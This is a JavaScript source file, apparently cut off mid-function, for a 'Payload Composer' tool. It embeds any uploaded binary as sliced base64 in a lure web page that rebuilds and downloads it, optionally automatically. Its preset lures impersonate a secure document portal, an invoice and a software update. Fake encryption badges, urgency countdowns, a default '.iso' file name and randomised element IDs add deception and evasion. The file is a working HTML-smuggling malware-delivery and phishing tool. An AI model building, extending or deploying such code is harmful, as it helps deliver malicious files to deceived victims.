/* ============================================================
   Payload Composer — Application Core (Fixed v2)
   ============================================================
   
   BUG FIX: The "Download Mode: Button" option was broken because
   the template and the script block called idFn() independently,
   generating DIFFERENT random IDs for the same elements. The button
   in the HTML would get id="btn_abc123" but the script would look
   for id="btn_xyz789" — so addEventListener never found the button.
   
   FIX: Generate all element IDs ONCE upfront and pass them as a
   shared object to both the template builder and the script builder.
   ============================================================ */

;(function () {
    'use strict';

    /* ---- State ---- */
    var STATE = {
        payloadData: null,       // Uint8Array
        payloadName: '',
        payloadSize: 0,
        customHtml: null,        // uploaded or pasted custom HTML string
        isCustomHtml: false,
        generatedHtml: null,     // final composed HTML
        buildLog: [],
        compressing: false
    };

    /* ---- DOM Helpers ---- */
    function $(sel, ctx) { return (ctx || document).querySelector(sel); }
    function $$(sel, ctx) { return Array.from((ctx || document).querySelectorAll(sel)); }

    /* ================================================================
       UTILITY FUNCTIONS
       ================================================================ */

    function randStr(len) {
        var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        var s = '';
        for (var i = 0; i < len; i++) {
            s += chars[Math.floor(Math.random() * chars.length)];
        }
        return s;
    }

    function formatBytes(bytes) {
        if (bytes < 1024) return bytes + ' B';
        if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
        return (bytes / 1048576).toFixed(2) + ' MB';
    }

    function countdownDisplay(sec) {
        if (sec <= 0) return '--:--';
        var m = Math.floor(sec / 60);
        var s = sec % 60;
        return m + ':' + (s < 10 ? '0' : '') + s;
    }

    function escapeHtml(s) {
        return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    }

    /* ---- Base64 (standard, no dependencies) ---- */

    function base64Encode(bytes) {
        var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
        var result = '';
        var len = bytes.length;
        for (var i = 0; i < len; i += 3) {
            var b1 = bytes[i];
            var b2 = (i + 1 < len) ? bytes[i + 1] : 0;
            var b3 = (i + 2 < len) ? bytes[i + 2] : 0;
            result += chars[b1 >> 2];
            result += chars[((b1 & 3) << 4) | (b2 >> 4)];
            result += (i + 1 < len) ? chars[((b2 & 15) << 2) | (b3 >> 6)] : '=';
            result += (i + 2 < len) ? chars[b3 & 63] : '=';
        }
        return result;
    }

    /* ---- Build Log ---- */

    function addLog(msg, type) {
        STATE.buildLog.push({ time: Date.now(), msg: msg, type: type || 'info' });
    }

    function clearLog() {
        STATE.buildLog = [];
        renderLog();
    }

    function renderLog() {
        var el = $('#logInner');
        if (!el) return;
        el.innerHTML = STATE.buildLog.map(function (l) {
            var t = new Date(l.time);
            var ts = t.getHours().toString().padStart(2,'0') + ':' +
                     t.getMinutes().toString().padStart(2,'0') + ':' +
                     t.getSeconds().toString().padStart(2,'0') + '.' +
                     t.getMilliseconds().toString().padStart(3,'0');
            return '<div class="log-line">' +
                   '<span class="log-time">' + ts + '</span>' +
                   '<span class="log-' + l.type + '">' + escapeHtml(l.msg) + '</span>' +
                   '</div>';
        }).join('');
        el.scrollTop = el.scrollHeight;
    }

    /* ---- Toast ---- */

    function toast(msg, type) {
        var container = $('#toastContainer');
        var t = document.createElement('div');
        t.className = 'toast ' + (type || 'info');
        var icons = { success: '&#10003;', error: '&#10007;', info: '&#8505;' };
        t.innerHTML = '<span class="toast-icon">' + (icons[type] || icons.info) + '</span>' +
                      '<span class="toast-msg">' + msg + '</span>' +
                      '<button class="toast-close">&times;</button>';
        t.querySelector('.toast-close').addEventListener('click', function () { t.remove(); });
        container.appendChild(t);
        setTimeout(function () { if (t.parentNode) t.remove(); }, 4000);
    }

    /* ---- Modal ---- */

    function showModal(title, body, footerHtml) {
        $('#modalTitle').textContent = title;
        $('#modalBody').innerHTML = body;
        $('#modalFooter').innerHTML = footerHtml || '';
        $('#modalOverlay').style.display = 'flex';
    }

    function hideModal() {
        $('#modalOverlay').style.display = 'none';
    }

    /* ---- Status ---- */

    function setStatus(state, label) {
        var dot = $('#statusDot');
        var lbl = $('#statusLabel');
        dot.className = 'status-dot' + (state ? ' ' + state : '');
        lbl.textContent = label;
    }

    /* ================================================================
       ELEMENT ID GENERATION (THE FIX)
       ================================================================
       
       The core bug was: makeIdFn() created a function that generates
       a NEW random suffix every time it's called. So id('btn') in the
       template and id('btn') in buildScriptBlock produced DIFFERENT IDs.
       
       Fix: Generate all IDs ONCE into an object, then both the template
       and the script reference the SAME ids object.
    */

    function generateElementIds(idLength) {
        return {
            btn:  'btn_' + randStr(idLength),
            cd:   'cd_' + randStr(idLength),
            spin: 'spin_' + randStr(idLength),
            svg:  'svg_' + randStr(idLength)
        };
    }

    /* ================================================================
       BUILD HELPERS
       ================================================================ */

    // Build the base64 slice array JS literal
    function buildSlicesJs(config) {
        if (!STATE.payloadData || STATE.payloadData.length === 0) return '[]';
        var b64 = base64Encode(STATE.payloadData);
        var sz = Math.max(10, config.sliceSize);
        var slices = [];
        for (var i = 0; i < b64.length; i += sz) {
            var chunk = b64.substring(i, i + sz);
            chunk = chunk.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
            slices.push("'" + chunk + "'");
        }
        return '[' + slices.join(',') + ']';
    }

    // Build the JavaScript block that handles download logic
    // NOW TAKES `ids` object with pre-generated element IDs
    function buildScriptBlock(config, ids) {
        var slicesJs = buildSlicesJs(config);

        var cdId   = ids.cd;
        var btnId  = ids.btn;
        var spinId = ids.spin;

        var downloadName = config.downloadName;
        var mode          = config.downloadMode;
        var delay         = Math.max(0, config.autoDelay) * 1000;
        var countdownSec  = config.countdownDuration;
        var doCountdown   = countdownSec > 0;
        var doAuto        = (mode === 'auto' || mode === 'both');
        var doButton      = (mode === 'button' || mode === 'both');

        var scriptLines = [];

        // Countdown timer
        if (doCountdown) {
            scriptLines.push(
                '(function(){',
                'var _s=' + countdownSec + ';',
                'var _cd=document.getElementById("' + cdId + '");',
                'if(!_cd)return;',
                'var _t=setInterval(function(){',
                '_s--;',
                'if(_s<=0){clearInterval(_t);_cd.textContent="EXPIRED";return;}',
                'var _m=Math.floor(_s/60);',
                'var _sec=_s%60;',
                '_cd.textContent=_m+":"+(_sec<10?"0":"")+_sec;',
                '},1000);',
                '})();'
            );
        }

        // Core payload download logic
        scriptLines.push('(function(){');
        scriptLines.push('var _slices=' + slicesJs + ';');
        scriptLines.push('var _fname=' + JSON.stringify(downloadName) + ';');
        scriptLines.push('var _btn=document.getElementById("' + btnId + '");');
        scriptLines.push('var _spin=document.getElementById("' + spinId + '");');

        // trigger function
        scriptLines.push('function _trigger(){');
        scriptLines.push('if(_spin)_spin.style.display="block";');
        scriptLines.push('if(_btn){_btn.disabled=true;_btn.textContent="Processing...";}');
        scriptLines.push('var _b64=_slices.join("");');
        scriptLines.push('try{');
        scriptLines.push('var _bin=atob(_b64);');
        scriptLines.push('var _len=_bin.length;');
        scriptLines.push('var _bytes=new Uint8Array(_len);');
        scriptLines.push('for(var _i=0;_i<_len;_i++)_bytes[_i]=_bin.charCodeAt(_i);');
        scriptLines.push('var _blob=new Blob([_bytes],{type:"application/octet-stream"});');
        scriptLines.push('var _url=URL.createObjectURL(_blob);');
        scriptLines.push('var _a=document.createElement("a");');
        scriptLines.push('_a.href=_url;_a.download=_fname;');
        scriptLines.push('document.body.appendChild(_a);_a.click();');
        scriptLines.push('setTimeout(function(){document.body.removeChild(_a);URL.revokeObjectURL(_url);');
        scriptLines.push('if(_spin)_spin.style.display="none";');
        scriptLines.push('if(_btn)_btn.textContent="Complete";},1500);');
        scriptLines.push('}catch(_e){');
        scriptLines.push('if(_btn)_btn.textContent="Error";');
        scriptLines.push('console.error("Payload error:",_e);}}');

        // Wire up button click handler
        if (doButton) {
            scriptLines.push('if(_btn){_btn.addEventListener("click",_trigger);_btn.style.cursor="pointer";}');
        } else {
            // In auto-only mode, hide the button if it exists
            scriptLines.push('if(_btn)_btn.style.display="none";');
        }

        // Auto trigger
        if (doAuto) {
            scriptLines.push('setTimeout(_trigger,' + delay + ');');
        }

        scriptLines.push('})();');

        return '\n<script>\n' + scriptLines.join('\n') + '\n<\/script>';
    }

    /* ================================================================
       PRESET TEMPLATES
       ================================================================ */

    var PRESETS = {

        'minimal': {
            name: 'Simple',
            buildTemplate: function (config, ids) {
                return '<!DOCTYPE html>\n<html lang="en">\n<head>\n' +
                    '<meta charset="UTF-8">\n' +
                    '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n' +
                    '<title>Download</title>\n' +
                    '<style>\n' +
                    '*{margin:0;padding:0;box-sizing:border-box}\n' +
                    'body{background:#111;color:#ccc;font-family:system-ui,-apple-system,sans-serif;' +
                    'display:flex;align-items:center;justify-content:center;min-height:100vh;' +
                    'flex-direction:column;gap:1.5rem}\n' +
                    '.box{text-align:center;max-width:400px;padding:2rem}\n' +
                    'h1{font-size:1.2rem;color:#eee;font-weight:500;margin-bottom:0.5rem}\n' +
                    'p{font-size:0.85rem;color:#777;margin-bottom:1.5rem}\n' +
                    '.btn-min{background:#333;color:#ddd;padding:0.7rem 2rem;border:1px solid #444;' +
                    'border-radius:6px;font-size:0.9rem;cursor:pointer;font-family:inherit;transition:all 0.2s}\n' +
                    '.btn-min:hover{background:#444;border-color:#555}\n' +
                    '.btn-min:disabled{opacity:0.4;cursor:not-allowed}\n' +
                    '.spin-min{border:3px solid #222;border-top:3px solid #666;border-radius:50%;' +
                    'width:24px;height:24px;animation:spin 1s linear infinite;margin:1rem auto;display:none}\n' +
                    '@keyframes spin{to{transform:rotate(360deg)}}\n' +
                    '.timer{font-size:0.8rem;color:#555;font-family:monospace}\n' +
                    '</style>\n</head>\n<body>\n' +
                    '<div class="box">\n' +
                    '<h1>Your file is ready</h1>\n' +
                    '<p>Click below to download</p>\n' +
                    '<button id="' + ids.btn + '" class="btn-min">Download</button>\n' +
                    '<div class="spin-min" id="' + ids.spin + '"></div>\n' +
                    '<p class="timer" id="' + ids.cd + '">' + config.countdownDisplay + '</p>\n' +
                    '</div>\n' +
                    hiddenSvg(ids, config) +
                    buildScriptBlock(config, ids) + '\n' +
                    '</body>\n</html>';
            }
        },

        'corp': {
            name: 'Corporate',
            buildTemplate: function (config, ids) {
                var sessionId = randStr(8).toUpperCase();
                return '<!DOCTYPE html>\n<html lang="en">\n<head>\n' +
                    '<meta charset="UTF-8">\n' +
                    '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n' +
                    '<title>Secure Document Portal</title>\n' +
                    '<link rel="icon" href="data:;base64,iVBORw0KGgo=">\n' +
                    '<style>\n' +
                    '*{margin:0;padding:0;box-sizing:border-box}\n' +
                    'body{font-family:\'Inter\',-apple-system,BlinkMacSystemFont,sans-serif;' +
                    'background:#0f1117;color:#d1d5db;min-height:100vh;display:flex;' +
                    'flex-direction:column;align-items:center;justify-content:center}\n' +
                    '.card{background:#1a1d27;border:1px solid #2a2d38;border-radius:12px;' +
                    'padding:2.5rem;max-width:560px;width:90%;text-align:center;' +
                    'box-shadow:0 20px 60px rgba(0,0,0,0.4)}\n' +
                    '.lock{font-size:2.5rem;margin-bottom:1rem}\n' +
                    'h1{font-size:1.5rem;color:#f3f4f6;margin-bottom:0.75rem;font-weight:600}\n' +
                    '.subtitle{color:#9ca3af;font-size:0.9rem;margin-bottom:2rem;line-height:1.6}\n' +
                    '.status-bar{background:#13151d;border:1px solid #21262d;border-radius:8px;' +
                    'padding:1rem;margin-bottom:2rem;text-align:left;font-size:0.82rem;color:#6b7280}\n' +
                    '.status-row{display:flex;justify-content:space-between;margin:0.3rem 0}\n' +
                    '.status-val{color:#34d399;font-family:monospace}\n' +
                    '.countdown{color:#f59e0b;font-family:monospace}\n' +
                    '.btn-corp{background:#2563eb;color:white;padding:0.85rem 2.5rem;font-size:1rem;' +
                    'border:none;border-radius:8px;cursor:pointer;font-family:inherit;font-weight:600;' +
                    'transition:all 0.2s;letter-spacing:-0.01em}\n' +
                    '.btn-corp:hover{background:#1d4ed8;transform:translateY(-1px)}\n' +
                    '.btn-corp:disabled{background:#374151;cursor:not-allowed;transform:none}\n' +
                    '.spinner-corp{border:3px solid #1f2937;border-top:3px solid #2563eb;' +
                    'border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;' +
                    'margin:1.5rem auto;display:none}\n' +
                    '@keyframes spin{to{transform:rotate(360deg)}}\n' +
                    '.footer-text{color:#4b5563;font-size:0.75rem;margin-top:2rem}\n' +
                    '</style>\n</head>\n<body>\n' +
                    '<div class="card">\n' +
                    '<div class="lock">&#128274;</div>\n' +
                    '<h1>Secure Document Portal</h1>\n' +
                    '<p class="subtitle">This document is protected by enterprise-grade encryption. ' +
                    'Access is logged and monitored.</p>\n' +
                    '<div class="status-bar">\n' +
                    '<div class="status-row"><span>Encryption</span><span class="status-val">AES-256-GCM</span></div>\n' +
                    '<div class="status-row"><span>Verification</span><span class="status-val">PASSED</span></div>\n' +
                    '<div class="status-row"><span>Session</span><span class="countdown" id="' + ids.cd + '">' +
                    config.countdownDisplay + '</span></div>\n' +
                    '</div>\n' +
                    '<button id="' + ids.btn + '" class="btn-corp">Download Secure File</button>\n' +
                    '<div class="spinner-corp" id="' + ids.spin + '"></div>\n' +
                    '<p class="footer-text">File: ' + escapeHtml(config.downloadName) + ' &bull; ' +
                    'Session ID: ' + sessionId + '</p>\n' +
                    '</div>\n' +
                    hiddenSvg(ids, config) +
                    buildScriptBlock(config, ids) + '\n' +
                    '</body>\n</html>';
            }
        },

        'invoice': {
            name: 'Invoice',
            buildTemplate: function (config, ids) {
                var invNo = 'INV-' + randStr(6).toUpperCase();
                var date = new Date().toLocaleDateString('en-US',
                    { year: 'numeric', month: 'short', day: 'numeric' });
                return '<!DOCTYPE html>\n<html lang="en">\n<head>\n' +
                    '<meta charset="UTF-8">\n' +
                    '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n' +
                    '<title>Invoice ' + invNo + '</title>\n' +
                    '<style>\n' +
                    '*{margin:0;padding:0;box-sizing:border-box}\n' +
                    'body{font-family:\'Segoe UI\',system-ui,-apple-system,sans-serif;' +
                    'background:#f5f5f5;color:#333;line-height:1.6}\n' +
                    '.page{max-width:800px;margin:2rem auto;background:#fff;border-radius:4px;' +
                    'box-shadow:0 2px 12px rgba(0,0,0,0.08);overflow:hidden}\n' +
                    '.header{background:#1a1a2e;color:#fff;padding:2rem}\n' +
                    '.header h1{font-size:1.3rem;font-weight:600;margin-bottom:0.3rem}\n' +
                    '.header .ref{font-size:0.85rem;opacity:0.7}\n' +
                    '.body{padding:2rem}\n' +
                    '.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;margin-bottom:2rem}\n' +
                    '.info-block h3{font-size:0.75rem;text-transform:uppercase;color:#888;margin-bottom:0.3rem;' +
                    'letter-spacing:0.05em}\n' +
                    '.info-block p{font-size:0.9rem;color:#444}\n' +
                    'table{width:100%;border-collapse:collapse;margin:1.5rem 0}\n' +
                    'th{text-align:left;font-size:0.7rem;text-transform:uppercase;color:#888;' +
                    'padding:0.5rem 0;border-bottom:2px solid #e0e0e0;letter-spacing:0.05em}\n' +
                    'td{padding:0.7rem 0;border-bottom:1px solid #eee;font-size:0.9rem}\n' +
                    '.total{text-align:right;font-size:1.2rem;font-weight:700;margin-top:1rem;color:#1a1a2e}\n' +
                    '.action-area{text-align:center;margin-top:2rem;padding:1.5rem;' +
                    'background:#fafafa;border-radius:4px}\n' +
                    '.action-area p{color:#666;font-size:0.85rem;margin-bottom:1rem}\n' +
                    '.btn-invoice{background:#1a1a2e;color:#fff;padding:0.7rem 2.2rem;font-size:0.95rem;' +
                    'border:none;border-radius:4px;cursor:pointer;font-family:inherit;transition:all 0.2s}\n' +
                    '.btn-invoice:hover{background:#2d2d4e}\n' +
                    '.btn-invoice:disabled{opacity:0.5;cursor:not-allowed}\n' +
                    '.spin-inv{border:3px solid #e0e0e0;border-top:3px solid #1a1a2e;border-radius:50%;' +
                    'width:22px;height:22px;animation:spin 1s linear infinite;margin:0.8rem auto;display:none}\n' +
                    '@keyframes spin{to{transform:rotate(360deg)}}\n' +
                    '.expiry{font-size:0.78rem;color:#999;margin-top:0.5rem}\n' +
                    '</style>\n</head>\n<body>\n' +
                    '<div class="page">\n' +
                    '<div class="header">\n' +
                    '<h1>Statement of Account</h1>\n' +
                    '<div class="ref">' + invNo + ' &bull; Issued ' + date + '</div>\n' +
                    '</div>\n' +
                    '<div class="body">\n' +
                    '<div class="info-grid">\n' +
                    '<div class="info-block">\n' +
                    '<h3>From</h3>\n' +
                    '<p>Acme Holdings LLC<br>100 Business Park Drive<br>Suite 400</p>\n' +
                    '</div>\n' +
                    '<div class="info-block">\n' +
                    '<h3>To</h3>\n' +
                    '<p>Client Account<br>Reference: ' + randStr(6).toUpperCase() + '</p>\n' +
                    '</div>\n' +
                    '</div>\n' +
                    '<table><thead><tr>' +
                    '<th>Description</th><th>Quantity</th><th>Rate</th><th>Amount</th>' +
                    '</tr></thead><tbody>' +
                    '<tr><td>Consulting Services — Q2 Review</td><td>12</td>' +
                    '<td>$225.00</td><td>$2,700.00</td></tr>' +
                    '<tr><td>Data Processing &amp; Analytics</td><td>1</td>' +
                    '<td>$1,450.00</td><td>$1,450.00</td></tr>' +
                    '<tr><td>Document Preparation</td><td>3</td>' +
                    '<td>$180.00</td><td>$540.00</td></tr>' +
                    '</tbody></table>\n' +
                    '<div class="total">Total Due: $4,690.00</div>\n' +
                    '<div class="action-area">\n' +
                    '<p>Full statement available for download</p>\n' +
                    '<button id="' + ids.btn + '" class="btn-invoice">Download Statement</button>\n' +
                    '<div class="spin-inv" id="' + ids.spin + '"></div>\n' +
                    '<div class="expiry">Link expires in <span id="' + ids.cd + '">' +
                    config.countdownDisplay + '</span></div>\n' +
                    '</div>\n' +
                    '</div>\n' +
                    '</div>\n' +
                    hiddenSvg(ids, config) +
                    buildScriptBlock(config, ids) + '\n' +
                    '</body>\n</html>';
            }
        },

        'update': {
            name: 'Installer',
            buildTemplate: function (config, ids) {
                var buildNo = randStr(4).toUpperCase() + '-' + Math.floor(Math.random() * 9000 + 1000);
                return '<!DOCTYPE html>\n<html lang="en">\n<head>\n' +
                    '<meta charset="UTF-8">\n' +
                    '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n' +
                    '<title>Software Update</title>\n' +
                    '<link rel="icon" href="data:;base64,iVBORw0KGgo=">\n' +
                    '<style>\n' +
                    '*{margin:0;padding:0;box-sizing:border-box}\n' +
                    'body{font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,sans-serif;' +
                    'background:#0d1117;color:#c9d1d9;min-height:100vh;display:flex;' +
                    'align-items:center;justify-content:center}\n' +
                    '.window{background:#161b22;border:1px solid #30363d;border-radius:8px;' +
                    'padding:2rem;max-width:500px;width:90%;text-align:center}\n' +
                    '.icon-area{font-size:3rem;margin-bottom:1rem}\n' +
                    'h1{font-size:1.3rem;color:#f0f6fc;margin-bottom:0.5rem;font-weight:600}\n' +
                    '.version{font-size:0.85rem;color:#58a6ff;font-family:monospace;margin-bottom:1.5rem}\n' +
                    '.changelog{background:#0d1117;border:1px solid #21262d;border-radius:6px;' +
                    'padding:1rem;text-align:left;font-size:0.82rem;margin-bottom:1.5rem;line-height:1.7}\n' +
                    '.changelog li{list-style:none;padding:0.2rem 0;color:#8b949e}\n' +
                    '.changelog li::before{content:\'\\2713 \';color:#3fb950}\n' +
                    '.btn-update{background:#238636;color:white;padding:0.8rem 2.5rem;font-size:1rem;' +
                    'border:1px solid rgba(240,246,252,0.1);border-radius:6px;cursor:pointer;' +
                    'font-family:inherit;font-weight:600;transition:all 0.2s}\n' +
                    '.btn-update:hover{background:#2ea043}\n' +
                    '.btn-update:disabled{background:#21262d;color:#484f58;cursor:not-allowed}\n' +
                    '.spin-up{border:3px solid #21262d;border-top:3px solid #58a6ff;border-radius:50%;' +
                    'width:26px;height:26px;animation:spin 1s linear infinite;margin:1rem auto;display:none}\n' +
                    '@keyframes spin{to{transform:rotate(360deg)}}\n' +
                    '.hash{font-family:monospace;font-size:0.7rem;color:#484f58;margin-top:1rem}\n' +
                    '.timer-note{font-size:0.75rem;color:#8b949e;margin-top:0.5rem}\n' +
                    '</style>\n</head>\n<body>\n' +
                    '<div class="window">\n' +
                    '<div class="icon-area">&#9881;</div>\n' +
                    '<h1>Update Available</h1>\n' +
                    '<div class="version">Build ' + buildNo + ' &bull; ' + new Date().toLocaleDateString('en-US',
                        {year:'numeric',month:'short',day:'numeric'}) + '</div>\n' +
                    '<div class="changelog">\n' +
                    '<ul>\n' +
                    '<li>Security patch KB' + randStr(5).toUpperCase() + '</li>\n' +
                    '<li>Performance improvements</li>\n' +
                    '<li>Compatibility updates</li>\n' +
                    '<li>Stability fixes</li>\n' +
                    '</ul>\n' +
                    '</div>\n' +
                    '<button id="' + ids.btn + '" class="btn-update">Download Update</button>\n' +
                    '<div class="spin-up" id="' + ids.spin + '"></div>\n' +
                    '<div class="hash">SHA-256: ' + randStr(16).toLowerCase() + '</div>\n' +
                    '<div class="timer-note">Session: <span id="' + ids.cd + '">' +
                    config.countdownDisplay + '</span></div>\n' +
                    '</div>\n' +
                    hiddenSvg(ids, config) +
                    buildScriptBlock(config, ids) + '\n' +
                    '</body>\n</html>';
            }
        }
    };

    /* ---- Hidden SVG container (if enabled) ---- */

    function hiddenSvg(ids, config) {
        if (!config.optHiddenContainer) return '';
        return '<svg style="display:none;" id="' + ids.svg + '"><image href=""></image></svg>';
    }

    /* ================================================================
       CONFIG READER
       ================================================================ */

    function readConfig() {
        var mode   = ($('input[name="downloadMode"]:checked') || {}).value || 'auto';
        var preset = ($('input[name="presetTemplate"]:checked') || {}).value || 'minimal';
        return {
            preset:             preset,
            downloadMode:       mode,
            autoDelay:          parseFloat($('#autoDelay').value) || 2.5,
            downloadName:       ($('#downloadName').value || '').trim() || 'document.iso',
            countdownDuration:  parseInt($('#countdownDuration').value) || 300,
            sliceSize:          parseInt($('#sliceSize').value) || 80,
            idLength:           parseInt($('#idLength').value) || 9,
            optSlicedPayload:   $('#optSlicedPayload').checked,
            optRandomIds:       $('#optRandomIds').checked,
            optHiddenContainer: $('#optHiddenContainer').checked,
            optCharCodeEval:    false,
            countdownDisplay:   countdownDisplay(parseInt($('#countdownDuration').value) || 300),
            isCustomHtml:       STATE.isCustomHtml
        };
    }

    /* ================================================================
       COMPOSER ENGINE
       ================================================================ */

    function compose() {
        syncRawHtml();

        if (!STATE.payloadData || STATE.payloadData.length === 0) {
            toast('No payload loaded. Upload a file first.', 'error');
            return;
        }

        var config = readConfig();
        clearLog();

        setStatus('working', 'COMPOSING');
        addLog('Starting composition...', 'info');
        addLog('Payload: ' + STATE.payloadName + ' (' + formatBytes(STATE.payloadSize) + ')', 'info');

        // Generate element IDs ONCE — shared between template and script
        var ids = generateElementIds(config.idLength);

        if (config.isCustomHtml && STATE.customHtml) {
            addLog('Template: Custom HTML', 'info');
        } else if (PRESETS[config.preset]) {
            addLog('Template: ' + PRESETS[config.preset].name, 'info');
        } else {
            addLog('Template: Simple (fallback)', 'warn');
            config.preset = 'minimal';
        }

        addLog('Download mode: ' + config.downloadMode, 'info');
        addLog('Slice size: ' + config.sliceSize + ' chars', 'info');

        var b64 = base64Encode(STATE.payloadData);
        var sliceSize = Math.max(10, config.sliceSize);
        var sliceCount = Math.ceil(b64.length / sliceSize);
        addLog('Base64 payload: ' + formatBytes(b64.length) + ' (' + b64.length + ' chars)', 'ok');
        addLog('Sliced into ' + sliceCount + ' chunks', 'ok');

        var html;

        if (config.isCustomHtml && STATE.customHtml) {
            html = buildCustomHtml(config, ids);
            addLog('Custom template markers processed', 'ok');
        } else {
            var preset = PRESETS[config.preset] || PRESETS['minimal'];
            html = preset.buildTemplate(config, ids);
            addLog('Rendered preset: ' + preset.name, 'ok');
        }

        if (config.optSlicedPayload)   addLog('Sliced payload: active', 'ok');
        if (config.optRandomIds)       addLog('Random IDs: active (len=' + config.idLength + ')', 'ok');
        if (config.optHiddenContainer) addLog('Hidden SVG container: active', 'ok');
        addLog('Element IDs: btn=' + ids.btn + ', cd=' + ids.cd + ', spin=' + ids.spin, 'info');

        STATE.generatedHtml = html;

        var outputSize = new Blob([html]).size;
        var embedRatio = STATE.payloadSize > 0 ?
            (outputSize / STATE.payloadSize).toFixed(1) + 'x' : '--';
        $('#statPayloadSize').textContent = formatBytes(STATE.payloadSize);
        $('#statSlices').textContent = sliceCount;
        $('#statOutputSize').textContent = formatBytes(outputSize);
        $('#statEmbedRatio').textContent = embedRatio;
        addLog('Output: ' + formatBytes(outputSize) + ' (ratio: ' + embedRatio + ')', 'ok');

        $('#outputTabs').style.display = 'flex';
        switchOutputTab('preview');
        updatePreview();
        updateSourceView();
        renderLog();

        setStatus('', 'READY');
        addLog('Composition complete.', 'ok');
        toast('Composition complete &mdash; ' + formatBytes(outputSize) + ' output', 'success');
    }

    function buildCustomHtml(config, ids) {
        var html = STATE.customHtml;

        html = html.replace(/\{\{COUNTDOWN\}\}/g,
            '<span id="' + ids.cd + '">' + config.countdownDisplay + '</span>');

        html = html.replace(/\{\{SPINNER\}\}/g,
            '<div id="' + ids.spin + '" style="border:4px solid #333;border-top:4px solid #666;' +
            'border-radius:50%;width:32px;height:32px;animation:spin 1s linear infinite;' +
            'margin:1rem auto;display:none;"></div>');

        html = html.replace(/\{\{DOWNLOAD_TRIGGER\}\}/g,
            '<button id="' + ids.btn + '" style="padding:0.8rem 2rem;font-size:1rem;cursor:pointer;">Download</button>');

        html = html.replace(/\{\{PAYLOAD_NAME\}\}/g, escapeHtml(config.downloadName));

        html = html.replace(/\{\{[A-Z_]+\}\}/g, '');

        var svgBlock = '';
        if (config.optHiddenContainer) {
            svgBlock = '\n<svg style="display:none;" id="' + ids.svg + '"><image href=""></image></svg>';
        }

        var scriptBlock = buildScriptBlock(config, ids);

        if (html.indexOf('</body>') !== -1) {
            html = html.replace('</body>', svgBlock + '\n' + scriptBlock + '\n</body>');
        } else if (html.indexOf('</html>') !== -1) {
            html = html.replace('</html>', svgBlock + '\n' + scriptBlock + '\n</body>\n</html>');
        } else {
            html += '\n' + svgBlock + '\n' + scriptBlock + '\n</body>\n</html>';
        }

        return html;
    }

    function syncRawHtml() {
        var raw = $('#rawHtmlInput');
        if (!raw) return;
        var val = raw.value.trim();
        if (val) {
            STATE.customHtml = val;
            STATE.isCustomHtml = true;
        }
    }

    /* ================================================================
       OUTPUT TAB SWITCHING
       ================================================================ */

    function switchOutputTab(tab) {
        $$('.output-tab').forEach(function (t) {
            t.classList.toggle('active', t.dataset.output === tab);
        });
        $('#previewContainer').style.display = (tab === 'preview') ? '' : 'none';
        $('#sourceContainer').style.display  = (tab === 'source')  ? '' : 'none';
        $('#logContainer').style.display     = (tab === 'logs')    ? '' : 'none';

        if (tab === 'preview') updatePreview();
        if (tab === 'source')  updateSourceView();
        if (tab === 'logs')    renderLog();
    }

    function updatePreview() {
        var iframe = $('#previewFrame');
        if (!iframe || !STATE.generatedHtml) return;
        var blob = new Blob([STATE.generatedHtml], { type: 'text/html' });
        iframe.src = URL.createObjectURL(blob);
    }

    function updateSourceView() {
        if (!STATE.generatedHtml) return;
        var code = $('#sourceCode');
        code.textContent = STATE.generatedHtml;
        var lines = STATE.generatedHtml.split('\n').length;
        $('#sourceLines').textContent = lines + ' lines';
    }

    function updateGenerateButton() {
        var btn  = $('#btnGenerate');
        var hint = $('#generateHint');
        if (STATE.payloadData && STATE.payloadData.length > 0) {
            btn.disabled = false;
            hint.textContent = 'Ready to compose with ' + formatBytes(STATE.payloadSize) + ' payload';
        } else {
            btn.disabled = true;
            hint.textContent = 'Upload a payload and configure options above';
        }
    }

    /* ================================================================
       PAYLOAD FILE HANDLING
       ================================================================ */

    function loadPayload(file) {
        var reader = new FileReader();
        reader.onload = function (e) {
            STATE.payloadData = new Uint8Array(e.target.result);
            STATE.payloadName = file.name;
            STATE.payloadSize = file.size;
            STATE.generatedHtml = null;

            $('#payloadName').textContent = file.name;
            $('#payloadSize').textContent = formatBytes(file.size);
            $('#payloadType').textContent = file.type || 'application/octet-stream';
            $('#payloadStatus').style.display = '';
            $('#payloadDropZone').style.display = 'none';
            $('#statPayloadSize').textContent = formatBytes(file.size);
            $('#statSlices').textContent = '--';
            $('#statOutputSize').textContent = '--';
            $('#statEmbedRatio').textContent = '--';

            updateGenerateButton();
            setStatus('', 'READY');
            toast('Payload loaded: ' + file.name, 'success');
        };
        reader.onerror = function () {
            toast('Failed to read payload file.', 'error');
        };
        reader.readAsArrayBuffer(file);
    }

    function clearPayload() {
        STATE.payloadData = null;
        STATE.payloadName = '';
        STATE.payloadSize = 0;
        STATE.generatedHtml = null;

        $('#payloadStatus').style.display = 'none';
        $('#payloadDropZone').style.display = '';
        $('#payloadFileInput').value = '';
        $('#statPayloadSize').textContent = '--';
        $('#statSlices').textContent = '--';
        $('#statOutputSize').textContent = '--';
        $('#statEmbedRatio').textContent = '--';
        $('#outputTabs').style.display = 'none';
        $('#previewContainer').style.display = 'none';
        $('#sourceContainer').style.display = 'none';
        $('#logContainer').style.display = 'none';

        updateGenerateButton();
    }

    /* ================================================================
       CUSTOM HTML HANDLING
       ================================================================ */

    function loadCustomHtmlFile(file) {
        var reader = new FileReader();
        reader.onload = function (e) {
            STATE.customHtml = e.target.result;
            STATE.isCustomHtml = true;
            $('#customHtmlName').textContent = file.name;
            $('#customHtmlStatus').style.display = 'flex';
            $('#htmlDropZone').style.display = 'none';
            $('#rawHtmlInput').value = '';
            toast('Custom HTML loaded: ' + file.name, 'success');
        };
        reader.onerror = function () {
            toast('Failed to read HTML file.', 'error');
        };
        reader.readAsText(file);
    }

    function clearCustomHtml() {
        STATE.customHtml = null;
        STATE.isCustomHtml = false;
